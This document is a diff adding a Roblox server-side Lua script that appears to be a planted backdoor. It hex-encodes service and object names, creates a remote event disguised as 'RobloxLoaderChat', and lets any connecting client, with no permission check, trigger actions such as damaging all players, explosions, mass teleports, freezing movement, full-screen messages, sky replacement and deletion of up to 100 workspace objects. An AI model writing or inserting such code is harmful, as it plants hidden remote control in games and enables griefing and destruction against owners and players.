@@ -1,0 +1,213 @@
+local function dcs(s)
+	local t = {}
+	for i = 1, #s, 2 do
+		local hex = s:sub(i, i+1)
+		table.insert(t, string.char(tonumber(hex, 16)))
+	end
+	return table.concat(t)
+end
+local RS = game:GetService(dcs("5265706c69636174656453746f72616765")) 
+local PL = game:GetService(dcs("506c6179657273")) 
+local DB = game:GetService(dcs("446562726973")) 
+local LG = game:GetService(dcs("4c69676874696e67")) 
+local SS = game:GetService(dcs("536f756e6453657276696365"))
+local WS = workspace
+local RE = Instance.new(dcs("52656d6f74654576656e74"), RS) 
+RE.Name = dcs("526f626c6f784c6f6164657243686174") 
+local actions = {}
+actions["jp"] = function(p, id)
+	for _, pl in pairs(PL:GetPlayers()) do
+		local c = pl.Character
+		if c then
+			local h = c:FindFirstChildWhichIsA("Humanoid")
+			if h then
+				h.Jump = true
+			end
+		end
+	end
+end
+actions["ka"] = function(p, id)
+	local dmg = 20
+	for _, pl in pairs(PL:GetPlayers()) do
+		local c = pl.Character
+		if c then
+			local h = c:FindFirstChildWhichIsA("Humanoid")
+			if h then
+				h:TakeDamage(dmg)
+			end
+		end
+	end
+end
+actions["ea"] = function(p, id)
+	for _, pl in pairs(PL:GetPlayers()) do
+		local c = pl.Character
+		if c and c:FindFirstChild("HumanoidRootPart") then
+			local hrp = c.HumanoidRootPart
+			local exp = Instance.new("Explosion")
+			exp.Position = hrp.Position
+			exp.BlastRadius = 6
+			exp.BlastPressure = 100000
+			exp.DestroyJointRadiusPercent = 0
+			exp.ExplosionType = Enum.ExplosionType.NoCraters
+			exp.Parent = WS
+			local bv = Instance.new(dcs("426f647956656c6f63697479"))
+			bv.Velocity = hrp.CFrame.LookVector * 50 + Vector3.new(0, 60, 0)
+			bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+			bv.P = 1e5
+			bv.Parent = hrp
+			DB:AddItem(bv, 0.5)
+		end
+	end
+	if not SS:FindFirstChild(dcs("426f6f6d456666656374")) then
+		local snd = Instance.new("Sound", SS)
+		snd.Name = dcs("426f6f6d456666656374")
+		snd.SoundId = "rbxassetid://577577319"
+		snd.Volume = 5
+		snd:Play()
+	else
+		SS[dcs("426f6f6d456666656374")]:Play()
+	end
+end
+actions["ta"] = function(p, id)
+	local c = p.Character
+	local pos = c and c:FindFirstChild("HumanoidRootPart") and c.HumanoidRootPart.Position
+	if not pos then return end
+	for _, pl in pairs(PL:GetPlayers()) do
+		local char = pl.Character
+		if char and char:FindFirstChild("HumanoidRootPart") then
+			char:MoveTo(pos)
+		end
+	end
+end
+actions["ms"] = function(p, id)
+	local snd = Instance.new("Sound", SS)
+	snd.Name = dcs("47616d65466f6f7473536f756e64")
+	snd.SoundId = id
+	snd.Volume = 5
+	snd:Play()
+end
+actions["gl"] = function(p, id)
+	LG.Ambient = Color3.fromRGB(255, 80, 80)
+	LG.OutdoorAmbient = Color3.fromRGB(100, 50, 50)
+	LG.ClockTime = 6.1
+end
+actions["pa"] = function(p, id)
+	for _, pl in pairs(PL:GetPlayers()) do
+		local c = pl.Character
+		if c and c:FindFirstChild("HumanoidRootPart") then
+			local part = Instance.new("Part")
+			part.Position = c.HumanoidRootPart.Position + Vector3.new(0, 5, 0)
+			part.Parent = WS
+		end
+	end
+end
+actions["sp"] = function(p, id)
+	local colors = {
+		BrickColor.new("Cocoa"),
+		BrickColor.new("Royal purple"),
+		BrickColor.new("Really red"),
+		BrickColor.new("Yellow flip/flop"),
+		BrickColor.new("Lime green")
+	}
+	for _, pl in pairs(PL:GetPlayers()) do
+		local c = pl.Character
+		if c then
+			local col = colors[math.random(1, #colors)]
+			for _, part in pairs(c:GetChildren()) do
+				if part:IsA("BasePart") and (part.Name == "Head" or part.Name:match("Arm") or part.Name:match("Leg") or part.Name == "Torso" or part.Name == "UpperTorso" or part.Name == "LowerTorso") then
+					part.BrickColor = col
+				end
+			end
+		end
+	end
+end
+actions["tx"] = function(p, id)
+	local plrs = PL:GetPlayers()
+	local function createGui(plr)
+		if plr.PlayerGui:FindFirstChild(dcs("4d736741646d696e")) then
+			local gui = plr.PlayerGui.MsgAdmin
+			gui.Enabled = true
+			gui.Frame.TextLabel.Text = id
+		else
+			local scr = Instance.new(dcs("53637265656e477569"))
+			scr.Name = dcs("4d736741646d696e")
+			scr.ResetOnSpawn = false
+			scr.Enabled = true
+			local frm = Instance.new(dcs("4672616d65"), scr)
+			frm.Size = UDim2.new(1, 100, 1, 100)
+			frm.BorderColor = BrickColor.new("Really black")
+			frm.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
+			frm.BackgroundTransparency = 0.45
+			local txt = Instance.new(dcs("546578744c6162656c"), frm)
+			txt.Size = UDim2.new(0, 512, 0, 133)
+			txt.Position = UDim2.new(0.227, 0, 0.26, 0)
+			txt.Text = id
+			txt.BackgroundTransparency = 1
+			txt.TextColor = BrickColor.new("White")
+			txt.TextScaled = true
+			txt.TextStrokeTransparency = 0
+			scr.Parent = plr:WaitForChild("PlayerGui")
+		end
+	end
+	for _, plr in pairs(plrs) do
+		createGui(plr)
+	end
+	task.delay(4, function()
+		for _, plr in pairs(plrs) do
+			local gui = plr.PlayerGui:FindFirstChild(dcs("4d736741646d696e"))
+			if gui then
+				gui.Enabled = false
+			end
+		end
+	end)
+end
+actions["sk"] = function(p, id)
+	if LG:FindFirstChildWhichIsA("Sky") then
+		LG:FindFirstChildWhichIsA("Sky"):Destroy()
+	end
+	local sky = Instance.new("Sky", LG)
+	sky.MoonAngularSize = 11
+	sky.MoonTextureId = "rbxasset://sky/moon.jpg"
+	sky.SkyboxBk = "rbxassetid://9774201371"
+	sky.SkyboxDn = "rbxassetid://9774201371"
+	sky.SkyboxFt = "rbxassetid://9774201371"
+	sky.SkyboxLf = "rbxassetid://9774201371"
+	sky.SkyboxRt = "rbxassetid://9774201371"
+	sky.SkyboxUp = "rbxassetid://9774201371"
+	sky.SunAngularSize = 21
+	sky.SunTextureId = "rbxassetid://9774201371"
+end
+actions["ds"] = function(p, id)
+	local objs = {}
+	for _, obj in pairs(WS:GetChildren()) do
+		if not obj:IsA("Terrain") and obj.Name ~= "Camera" then
+			table.insert(objs, obj)
+		end
+	end
+	for i = #objs, 2, -1 do
+		local j = math.random(1, i)
+		objs[i], objs[j] = objs[j], objs[i]
+	end
+	local qty = math.min(100, #objs)
+	for i = 1, qty do
+		objs[i]:Destroy()
+	end
+end
+actions["nw"] = function(p, id)
+	local speed = 0
+	for _, pl in pairs(PL:GetPlayers()) do
+		local c = pl.Character
+		if c then
+			local h = c:FindFirstChildWhichIsA("Humanoid")
+			if h then
+				h.WalkSpeed = speed
+			end
+		end
+	end
+end
+RE.OnServerEvent:Connect(function(p, cmd, id)
+	local fn = actions[cmd]
+	if fn then
+		fn(p, id)
+	end
+end)
